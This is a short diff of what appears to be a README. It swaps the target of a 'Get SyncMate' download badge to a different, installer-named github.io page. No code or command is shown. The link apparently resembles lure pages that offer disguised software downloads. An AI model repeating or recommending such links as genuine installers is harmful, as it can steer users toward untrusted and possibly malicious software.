@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://kioloao39498.github.io/.github/SyncMate">  
+<a href="https://installation-osx.github.io/.github/SyncMate">  
 <img src="https://img.shields.io/badge/☁️_Get_SyncMate-1E90FF?style=for-the-badge&logo=apple" alt="Launch SyncMate">  
 </a>  
 </div>  
